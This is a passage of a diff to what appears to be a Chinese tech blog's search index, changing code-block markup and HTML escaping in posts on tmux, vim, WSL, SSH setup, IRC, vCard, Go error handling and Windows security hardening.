+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 插件</span><br><span class="line"># List of plugins</span><br><span class="line">set -g @plugin &#x27;tmux-plugins/tpm&#x27;</span><br><span class="line">set -g @plugin &#x27;tmux-plugins/tmux-sensible&#x27;</span><br><span class="line"></span><br><span class="line"># Other examples:</span><br><span class="line"># set -g @plugin &#x27;github_username/plugin_name&#x27;</span><br><span class="line"># set -g @plugin &#x27;git@github.com/user/plugin&#x27;</span><br><span class="line"># set -g @plugin &#x27;git@bitbucket.com/user/plugin&#x27;</span><br><span class="line"></span><br><span class="line"># Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf)</span><br><span class="line">run -b &#x27;~/.tmux/plugins/tpm/tpm&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>值得注意的是，在更改<code>.tmux.conf</code>文件后，应该重启tmux，或者重载配置文件。</p>
 <h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>有关tmux的更多使用技巧可以参考<a href="https://www.kancloud.cn/kancloud/tmux">《tmux: Productive Mouse-Free Development》</a>一书。</p>
@@ -4221,7 +4223,7 @@
     <title>UDP 协议分析</title>
     <url>/2021/01/12/udp/</url>
     <content><![CDATA[<p>UDP 全称 User Datagram Protocol，即<strong>用户数据报协议</strong>，它为调用它的应用程序提供了一种不可靠、无连接的服务。</p>
-<p>UDP 无非就是对网络层协议增加了一点（多路）复用/（多路）分解服务而已。</p>
+<p>UDP 无非就是对网络层协议增加了一点（多路）复用&#x2F;（多路）分解服务而已。</p>
 <p>使用 UDP 的上层协议有：</p>
 <ul>
 <li><a href="/2020/12/29/dns/" title="DNS">DNS</a></li>
@@ -4259,7 +4261,7 @@
 <span id="more"></span>
 
 <h2 id="升级到-WSL-2"><a href="#升级到-WSL-2" class="headerlink" title="升级到 WSL 2"></a>升级到 WSL 2</h2><p>要查看当前安装的 WSL 版本，可通过 <code>wsl --list --verbose</code> 命令查看，其输出如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  NAME                   STATE           VERSION</span><br><span class="line">* Ubuntu                 Running         1</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">  NAME                   STATE           VERSION</span><br><span class="line">* Ubuntu                 Running         1</span><br></pre></td></tr></table></figure>
 
 <p>VERSION 下面的结果为其版本号，上述为 WSL 1。</p>
 <p>截至目前为止，无法直接安装 WSL 2，需要先安装 WSL 1，然后将其升级为 WSL 2。升级步骤如下：</p>
@@ -4356,12 +4358,12 @@
 <li><code>:set ff=unix</code>：设置文件为unix格式</li>
 </ul>
 <h2 id="vimrc"><a href="#vimrc" class="headerlink" title="vimrc"></a>vimrc</h2><p>Vim有多个配置文件，当前用户的配置文件为用户家目录下的<code>.vimrc</code>隐藏文件，Vim启动时会按照该文件中的配置开启相应的功能。个人常做的基本配置项如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; 这是一行注释</span><br><span class="line">&quot; 显示行号</span><br><span class="line">set number</span><br><span class="line"></span><br><span class="line">&quot; 语法高亮</span><br><span class="line">syntax enable</span><br><span class="line"></span><br><span class="line">&quot; tab缩进</span><br><span class="line">set tabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set smarttab</span><br><span class="line"></span><br><span class="line">&quot; 鼠标可用</span><br><span class="line">&quot;set mouse=a</span><br><span class="line"></span><br><span class="line">&quot; 配色方案</span><br><span class="line">set t_Co=256</span><br><span class="line">set background=dark</span><br><span class="line">colorscheme desert</span><br><span class="line"></span><br><span class="line">&quot; 匹配模式</span><br><span class="line">set showmatch</span><br><span class="line"></span><br><span class="line">&quot; 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set smartindent</span><br><span class="line"></span><br><span class="line">&quot; 显示命令</span><br><span class="line">set showcmd</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot; 这是一行注释</span><br><span class="line">&quot; 显示行号</span><br><span class="line">set number</span><br><span class="line"></span><br><span class="line">&quot; 语法高亮</span><br><span class="line">syntax enable</span><br><span class="line"></span><br><span class="line">&quot; tab缩进</span><br><span class="line">set tabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set smarttab</span><br><span class="line"></span><br><span class="line">&quot; 鼠标可用</span><br><span class="line">&quot;set mouse=a</span><br><span class="line"></span><br><span class="line">&quot; 配色方案</span><br><span class="line">set t_Co=256</span><br><span class="line">set background=dark</span><br><span class="line">colorscheme desert</span><br><span class="line"></span><br><span class="line">&quot; 匹配模式</span><br><span class="line">set showmatch</span><br><span class="line"></span><br><span class="line">&quot; 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set smartindent</span><br><span class="line"></span><br><span class="line">&quot; 显示命令</span><br><span class="line">set showcmd</span><br></pre></td></tr></table></figure>
 
 <h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>Vim自带了多种主题，即配色方案，默认存放在Vim安装目录下的colors文件夹下，在Vim中输入命令<code>:echo $VIMRUNTIME</code>即可显示Vim的安装目录，以我的为例，其安装目录为<code>/usr/share/vim/vim80</code>。</p>
 <p>如果你想更改默认的主题，可以按照上面的配置，在<code>vimrc</code>文件中使用<code>colorscheme &lt;主题名&gt;</code>进行配置。Vim默认使用的是<code>default</code>主题。如果你想使用第三方或自定义的主题，则需要将下载的主题文件存放到colors文件夹下（<code>~/.vim/colors</code>下也行），然后再进行相关配置。</p>
 <h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>Vim支持很多插件，为了简化插件的安装，由此诞生了许多的插件管理器，<a href="https://github.com/VundleVim/Vundle.vim">Vundle</a>是使用最多的Vim插件管理器，但个人倾向于使用<a href="https://github.com/junegunn/vim-plug">vim-plug</a>插件管理器，vim-plug相比Vundle最大的优势是支持异步安装，该特性可以极大的加速多个插件的安装速度。<br>使用如下命令即可安装vim-plug：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/<span class="built_in">autoload</span>/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>
 
 <p>安装完vim-plug插件管理器后，只需在<code>.vimrc</code>文件中做相关配置，然后进入Vim的命令行模式，输入<code>:PlugInstall</code>命令，即可自动下载并安装相应的插件，升级插件可使用<code>:PlugUpdate</code>命令，升级vim-plug本身，可使用<code>:PlugUpgrade</code>命令。个人常用的插件如下：</p>
 <ul>
@@ -4370,7 +4372,7 @@
 <li><a href="https://github.com/mhinz/vim-startify">startify</a>：自定义起始页</li>
 </ul>
 <p>相应的，<code>.vimrc</code>文件中插件相关的配置项如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; vim-plug</span><br><span class="line">call plug#begin(&#x27;~/.vim/plugged&#x27;)</span><br><span class="line"></span><br><span class="line">function! BuildYCM(info)</span><br><span class="line">  &quot; info is a dictionary with 3 fields</span><br><span class="line">  &quot; - name:   name of the plugin</span><br><span class="line">  &quot; - status: &#x27;installed&#x27;, &#x27;updated&#x27;, or &#x27;unchanged&#x27;</span><br><span class="line">  &quot; - force:  set on PlugInstall! or PlugUpdate!</span><br><span class="line">  if a:info.status == &#x27;installed&#x27; || a:info.force</span><br><span class="line">    !./install.py</span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line">Plug &#x27;Valloric/YouCompleteMe&#x27;, &#123; &#x27;do&#x27;: function(&#x27;BuildYCM&#x27;) &#125;</span><br><span class="line">Plug &#x27;scrooloose/nerdtree&#x27;, &#123; &#x27;on&#x27;:  &#x27;NERDTreeToggle&#x27; &#125;</span><br><span class="line">Plug &#x27;mhinz/vim-startify&#x27;</span><br><span class="line"></span><br><span class="line">call plug#end()</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot; vim-plug</span><br><span class="line">call plug#begin(&#x27;~/.vim/plugged&#x27;)</span><br><span class="line"></span><br><span class="line">function! BuildYCM(info)</span><br><span class="line">  &quot; info is a dictionary with 3 fields</span><br><span class="line">  &quot; - name:   name of the plugin</span><br><span class="line">  &quot; - status: &#x27;installed&#x27;, &#x27;updated&#x27;, or &#x27;unchanged&#x27;</span><br><span class="line">  &quot; - force:  set on PlugInstall! or PlugUpdate!</span><br><span class="line">  if a:info.status == &#x27;installed&#x27; || a:info.force</span><br><span class="line">    !./install.py</span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line">Plug &#x27;Valloric/YouCompleteMe&#x27;, &#123; &#x27;do&#x27;: function(&#x27;BuildYCM&#x27;) &#125;</span><br><span class="line">Plug &#x27;scrooloose/nerdtree&#x27;, &#123; &#x27;on&#x27;:  &#x27;NERDTreeToggle&#x27; &#125;</span><br><span class="line">Plug &#x27;mhinz/vim-startify&#x27;</span><br><span class="line"></span><br><span class="line">call plug#end()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -4412,7 +4414,7 @@
     <url>/2018/09/23/what-is-development-environment/</url>
     <content><![CDATA[<p>按照编程语言的执行原理，一般将其分为<strong>编译型语言</strong>（如 C）和<strong>解释型语言</strong>（如 Python），对于编译型语言来说，它的开发环境就代表该语言的<strong>编译器</strong>和其<strong>基本类库</strong>，对于解释型语言来说，它的开发环境就代表该语言的<strong>解释器</strong>和其<strong>基本类库</strong>。请注意，这里我并没有提到<strong>编辑器</strong>，因为编辑器并不属于每种语言所特有的范畴。</p>
 <p>对于解释型语言来说，它的开发环境就等于运行环境，而对于编译型语言，可以说它不需要运行环境。请注意，Java 可以理解为是一种<strong>先编译后解释</strong>的语言，所以运行 Java 程序之前需要安装 JRE（Java 运行环境）。</p>
-<p>如今许多语言的 IDE（集成开发环境），已经集编辑器、该语言的编译器/解释器、基本类库等于一体。</p>
+<p>如今许多语言的 IDE（集成开发环境），已经集编辑器、该语言的编译器&#x2F;解释器、基本类库等于一体。</p>
 ]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -4438,7 +4440,7 @@
     <url>/2018/09/12/what-is-irc/</url>
     <content><![CDATA[<p><strong>IRC</strong>，全称 Internet Relay Chat，即<strong>因特网中继聊天</strong>，是早期经常使用的网络聊天方式，其主要用于群体聊天，但同样也可以用于个人对个人的聊天。</p>
 <p>IRC 协议属于应用层协议，使用的传输层协议为 TCP，使用的端口为 <strong>6667</strong>（明文传输，如 <code>irc://chat.freenode.net</code>）或 <strong>6697</strong>（SSL 加密传输，如 <code>ircs://chat.freenode.net:6697</code>）。</p>
-<p>IRC 是一个<strong>分布式</strong>的 <strong>C/S</strong> 架构，一个 IRC 服务器可以连接其他的 IRC 服务器以扩展为一个<strong>IRC 网络</strong>，通过连接到一个 IRC 服务器，我们可以访问这个服务器以及它所连接的其他服务器上的<strong>频道</strong>，频道存在于一个 IRC 服务器上，一个频道类似于一个聊天室，频道名称必须以 <code>#</code> 符号开始，例如 <code>#irchelp</code>。</p>
+<p>IRC 是一个<strong>分布式</strong>的 <strong>C&#x2F;S</strong> 架构，一个 IRC 服务器可以连接其他的 IRC 服务器以扩展为一个<strong>IRC 网络</strong>，通过连接到一个 IRC 服务器，我们可以访问这个服务器以及它所连接的其他服务器上的<strong>频道</strong>，频道存在于一个 IRC 服务器上，一个频道类似于一个聊天室，频道名称必须以 <code>#</code> 符号开始，例如 <code>#irchelp</code>。</p>
 <p>大多数的 IRC 服务器不需要客户注册登录，虽然在连接前必须设定好昵称（nickname），但客户端一般都会自动分配一个。</p>
 <p>目前使用最广的 IRC 服务器为 <a href="https://freenode.net/">freenode</a> ，而 IRC 客户端软件有多种，比如基于 Firefox 浏览器的 IRC 插件 <a href="http://chatzilla.hacksrus.com/">ChatZilla</a> ，基于网页的 <a href="https://webchat.freenode.net/">Webchat</a> ，基于命令行的 <a href="https://irssi.org/">Irssi</a> 、<a href="https://weechat.org/">WeeChat</a> 等等。</p>
 <p>个人经常使用的 IRC 客户端为 Irssi，在 Ubuntu 中可以使用 <code>apt install irssi</code> 安装，之后直接输入 <code>irssi</code> 即可启动，输入 <code>irssi --help</code> 可查看更多命令参数。<br>启动 irssi 后可输入更多的命令，输入 <code>/help</code> 可查看所有可用命令，输入 <code>/connect Freenode</code> 即可连接到 freenode 服务器，之后再输入 <code>/join #linuxba</code> 即可加入 <code>#linuxba</code> 频道。<br>这里需要注意，freenode 服务器由于种种原因，在国内无法访问，而 irssi 又不支持代理，所以推荐使用 <a href="https://github.com/rofl0r/proxychains-ng">proxychains-ng</a> 代理 irssi。</p>
@@ -4463,7 +4465,7 @@
     <url>/2021/02/04/what-is-vcard/</url>
     <content><![CDATA[<p>vCard 是广为使用的电子名片的文件格式标准，常用于手机通讯录文件中，其后缀名常为 <code>.vcf</code>。</p>
 <p>一个典型的 vCard 文件内容如下所示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BEGIN:VCARD</span><br><span class="line">VERSION:2.1</span><br><span class="line">N;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testa</span><br><span class="line">FN;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testa</span><br><span class="line">TEL;CELL:12345678910</span><br><span class="line">END:VCARD</span><br><span class="line">BEGIN:VCARD</span><br><span class="line">VERSION:2.1</span><br><span class="line">N;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testb</span><br><span class="line">FN;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testb</span><br><span class="line">TEL;CELL:12345678910</span><br><span class="line">END:VCARD</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">BEGIN:VCARD</span><br><span class="line">VERSION:2.1</span><br><span class="line">N;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testa</span><br><span class="line">FN;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testa</span><br><span class="line">TEL;CELL:12345678910</span><br><span class="line">END:VCARD</span><br><span class="line">BEGIN:VCARD</span><br><span class="line">VERSION:2.1</span><br><span class="line">N;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testb</span><br><span class="line">FN;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testb</span><br><span class="line">TEL;CELL:12345678910</span><br><span class="line">END:VCARD</span><br></pre></td></tr></table></figure>
 
 <p>每个 vCard 条目通过 <code>BEGIN:VCARD</code> 与 <code>END:VCARD</code> 包裹，其中 <code>VERSION</code> 字段表示 vCard 版本号，<code>N</code> 和 <code>FN</code> 字段分别表示 <em>姓名</em> 和 <em>名</em>，<code>TEL</code> 字段表示电话号码。</p>
 <p>GitHub 上的 <a href="https://github.com/metowolf/vCards">vCards</a> 项目提供了类似中国黄页的功能。</p>
@@ -4569,7 +4571,7 @@
 </ul>
 <h2 id="一些评论"><a href="#一些评论" class="headerlink" title="一些评论"></a>一些评论</h2><p>Pulkit Singhania：</p>
 <blockquote>
-<p>Cloudsigma 实际上也是一个不错的选择。<br>  他们提供免费的 vps，没有任何登录或任何注册的免费，但只有一个小时。<br>  我亲自尝试过，它提供 2GB 内存和 50GB 硬盘，最高可达 25兆字节/秒的互联网流量。<br>  如果你使用公司电子邮件注册，则可免费试用 7 天</p>
+<p>Cloudsigma 实际上也是一个不错的选择。<br>  他们提供免费的 vps，没有任何登录或任何注册的免费，但只有一个小时。<br>  我亲自尝试过，它提供 2GB 内存和 50GB 硬盘，最高可达 25兆字节&#x2F;秒的互联网流量。<br>  如果你使用公司电子邮件注册，则可免费试用 7 天</p>
 </blockquote>
 ]]></content>
       <categories>
@@ -4609,7 +4611,7 @@
 
 <p>多可惜。哎呀。</p>
 <p>从理论上讲，我们可以要求程序员不要忽略返回的错误。通过静态分析或约定。在实践中，仅在最关键的错误编程任务中才能忍受这一痛苦。也许这就是 Go 的目的。</p>
-<h3 id="panic-recover"><a href="#panic-recover" class="headerlink" title="panic/recover"></a>panic/recover</h3><p>只要标准库很少使用它们，panic 和 recover 就不够好。为什么一个数组越界比格式字符串损坏或连接中断更容易引起 panic？Go 想完全避免异常，但意识到它们不能 —— 这里和那里都加了几个异常，让我很困惑，不知道哪个错误什么时候发生。</p>
+<h3 id="panic-x2F-recover"><a href="#panic-x2F-recover" class="headerlink" title="panic&#x2F;recover"></a>panic&#x2F;recover</h3><p>只要标准库很少使用它们，panic 和 recover 就不够好。为什么一个数组越界比格式字符串损坏或连接中断更容易引起 panic？Go 想完全避免异常，但意识到它们不能 —— 这里和那里都加了几个异常，让我很困惑，不知道哪个错误什么时候发生。</p>
 <h3 id="或许下次吧"><a href="#或许下次吧" class="headerlink" title="或许下次吧"></a>或许下次吧</h3><p>所以我说这句话的时候非常遗憾，因为 Go 有很多惊人的想法和功能，但是如果没有现代的错误处理 —— 我是不会<strong>去</strong>的。</p>
 <p>我还在等待那个开源、并发、<a href="https://web.archive.org/web/20120922025809/http://shootout.alioth.debian.org/u64q/code-used-time-used-shapes.php">左下角的语言</a>出现。有什么建议，欢迎大家多多指教。</p>
 ]]></content>
@@ -4629,13 +4631,13 @@
     <title>Windows 10 中莫名其妙的“端口被占用”问题解决</title>
     <url>/2021/06/01/win10-port-is-already-in-use-problem/</url>
     <content><![CDATA[<p>大约是自 Windows 10 1709 更新之后（或许是 1809？2004？），莫名其妙的存在类似“端口被占用”这样的问题，比如像下面这样的报错信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: listen EACCES: permission denied 0.0.0.0:3000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Error: listen EACCES: permission denied 0.0.0.0:3000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>或者启动 SS 时提示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Shadowsocks Error: Port already in use</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Shadowsocks Error: Port already in use</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>又或者启动 Docker 时提示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error starting userland proxy: Bind for 0.0.0.0:50051: unexpected error Permission denied.</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Error starting userland proxy: Bind for 0.0.0.0:50051: unexpected error Permission denied.</span><br></pre></td></tr></table></figure>
 
 <p>电脑重启几次之后，以上报错可能会消失，一切又恢复正常。</p>
 <span id="more"></span>
@@ -4680,7 +4682,7 @@
 <p>创建陷阱帐户：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中创建一个名为 Administrator 的本地帐户，并将它的权限设置成最低，加上一个超过 10 位的强密码。可通过将其隶属于 Guest 组已达到权限最低。</p>
 <p>限制用户数量：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中删除所有的测试帐户、共享帐户和普通部门帐户，一般情况下，如果系统用户超过 10 个，一般总会存在一两个弱口令帐户。</p>
 <p>开启帐户锁定策略：<br>在<strong>本地安全策略</strong>的<strong>帐户锁定策略</strong>中设置帐户锁定阈值为 3 次，帐户锁定时间为 30 分钟，重置帐户锁定计数器为 30 分钟之后。</p>
-<h2 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h2><p>一个安全操作系统的基本原则是：<strong>最小的权限+最少的服务=最大的安全</strong>。</p>
+<h2 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h2><p>一个安全操作系统的基本原则是：<strong>最小的权限+最少的服务&#x3D;最大的安全</strong>。</p>
 <p>开启密码策略：<br>在<strong>本地安全策略</strong>的<strong>密码策略</strong>中启用密码复杂性要求，设置密码长度最小值为 7，密码最短使用期限为 1，密码最长使用期限为 42，强制密码历史为 24，禁用以可还原的加密储存密码。</p>
 <p>设置双重加密帐户保护：<br>在运行对话框中输入 <code>syskey</code>，启用 SAM 数据库加密工具，为 Windows 登录设置双重加密，注意此功能在 Windows10 中已被剔除。</p>
 <p>取消默认共享：<br>编辑注册表键 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters</code>，新建项 <code>AutoShareServer</code>，值为 <code>0</code>，即可关闭盘符默认共享，新建项 <code>AutoShareWks</code>，值为 <code>0</code>，即可关闭 ADMIN 默认共享。</p>
@@ -4741,13 +4743,13 @@
 <p>到 Ubuntu 的下载页，可以看到发布者为 Canonical 公司，这也正是 Ubuntu 的维护公司，值得注意的是，Canonical 公司还发布了特定版本的 Ubuntu 系统，例如 Ubuntu 16.04 LTS、Ubuntu 18.04 LTS 等，个人建议直接下载无版本号的 Ubuntu，而不要下载特定版本的 Ubuntu，因为无版本号的 Ubuntu 会在新版本 Ubuntu 发布之后切换到最新版，所以它始终指向最新的 Ubuntu。同时请注意，应用商店里 Ubuntu 软件的更新并不会升级 Ubuntu 版本，如果你恰好安装的是旧版本，想要升级到新版本，可以在 WSL 中运行 <code>do-release-upgrade</code> 命令升级到最新版。</p>
 <p>下载完成后，要启动 Ubuntu 有多种方式，可以在 <strong>PowerShell</strong> 或 <strong>cmd</strong> 中输入 <code>wsl</code> 或 <code>bash</code> 或 <code>ubuntu</code> 都可启动，也可以直接在 <strong>开始菜单</strong> 中点击 Ubuntu 图标启动。</p>
 <h2 id="SSH-问题"><a href="#SSH-问题" class="headerlink" title="SSH 问题"></a>SSH 问题</h2><p>要想在 WSL 中开启 SSH 服务，需要在配置文件（<code>/etc/ssh/sshd_config</code>）中作如下修改：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Port 2222  #将22改为2222，因Win10中自带的SSH服务也在监听22端口</span><br><span class="line">ListenAddress 0.0.0.0  #取消注释，监听所有IP</span><br><span class="line">UsePrivilegeSeparation no  #将yes修改为no</span><br><span class="line">PermitRootLogin yes  #将prohibit-password修改为yes，允许root用户登录，视个人情况而定</span><br><span class="line">PasswordAuthentication yes  #将no修改为yes，允许密码登录</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Port 2222  #将22改为2222，因Win10中自带的SSH服务也在监听22端口</span><br><span class="line">ListenAddress 0.0.0.0  #取消注释，监听所有IP</span><br><span class="line">UsePrivilegeSeparation no  #将yes修改为no</span><br><span class="line">PermitRootLogin yes  #将prohibit-password修改为yes，允许root用户登录，视个人情况而定</span><br><span class="line">PasswordAuthentication yes  #将no修改为yes，允许密码登录</span><br></pre></td></tr></table></figure>
 
 <p>修改完成后用 <code>sudo service ssh start</code> 启动 SSH 服务，可能会报如下错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Could not load host key: /etc/ssh/ssh_host_rsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_dsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Could not load host key: /etc/ssh/ssh_host_rsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_dsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure>
 
 <p>并且此时无法使用 SSH 客户端连接到服务器端，客户端会报如下错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection closed by 127.0.0.1 port 2222</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Connection closed by 127.0.0.1 port 2222</span><br></pre></td></tr></table></figure>
 
 <p>造成这种情况的原因是服务端在启动 SSH 服务时发现加密过程中需要用到的密钥文件未找到，可依次用如下命令生成所需文件：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span><br><span class="line">ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</span><br><span class="line">ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure>
@@ -4758,7 +4760,7 @@
 
 <p>随后打开 X Server 客户端（比如 <a href="https://sourceforge.net/projects/xming/">Xming</a> 或 <a href="https://sourceforge.net/projects/vcxsrv/">VcXsrv</a>）并将 Display 项设为 0 即可运行图形化应用。笔者所使用的是 <a href="https://mobaxterm.mobatek.net/">MobaXterm</a>，其设置路径为 <strong>Settings</strong> —&gt; <strong>Configuration</strong> —&gt; <strong>X11</strong> —&gt; <strong>Display offset</strong>。</p>
 <h2 id="EXE-程序问题"><a href="#EXE-程序问题" class="headerlink" title="EXE 程序问题"></a>EXE 程序问题</h2><h2 id="netstat-和-ps"><a href="#netstat-和-ps" class="headerlink" title="netstat 和 ps"></a>netstat 和 ps</h2><h2 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h2><p>WSL 中至今还没有使用 systemd，因此执行类似 <code>sudo systemctl start nginx</code> 这样的命令，会报如下这样的错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System has not been booted with systemd as init system (PID 1). Can&#x27;t operate.</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">System has not been booted with systemd as init system (PID 1). Can&#x27;t operate.</span><br></pre></td></tr></table></figure>
 
 <p>一个替代方法是使用 service，如 <code>sudo service nginx start</code>。</p>
 <h2 id="后台运行问题"><a href="#后台运行问题" class="headerlink" title="后台运行问题"></a>后台运行问题</h2><h2 id="无法使用的软件"><a href="#无法使用的软件" class="headerlink" title="无法使用的软件"></a>无法使用的软件</h2><p>以下软件在 WSL 中暂时无法正常使用：</p>
@@ -4797,7 +4799,7 @@
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">firstName</span>&gt;</span>Tian<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastName</span>&gt;</span>Song<span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">streetAddr</span>&gt;</span>中关村南大街5号<span class="tag">&lt;/<span class="name">streetAddr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">city</span>&gt;</span>北京市<span class="tag">&lt;/<span class="name">city</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>100081<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prof</span>&gt;</span>Computer System<span class="tag">&lt;/<span class="name">prof</span>&gt;</span><span class="tag">&lt;<span class="name">prof</span>&gt;</span>Security<span class="tag">&lt;/<span class="name">prof</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p><strong>JSON</strong>，JavaScript Object Notation（JavaScript 对象表示法），倘若我要表示某个人的简要信息，用 JSON 可写为：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;firstName&quot;</span> : <span class="string">&quot;Tian&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;lastName&quot;</span> : <span class="string">&quot;Song&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;address&quot;</span> : &#123;</span><br><span class="line">                    <span class="attr">&quot;streetAddr&quot;</span> : <span class="string">&quot;中关村南大街5号&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;city&quot;</span> : <span class="string">&quot;北京市&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;zipcode&quot;</span> : <span class="string">&quot;100081&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">    <span class="attr">&quot;prof&quot;</span> : [<span class="string">&quot;Computer System&quot;</span>, <span class="string">&quot;Security&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;firstName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Tian&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;lastName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Song&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;address&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;streetAddr&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;中关村南大街5号&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;city&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;北京市&quot;</span><span 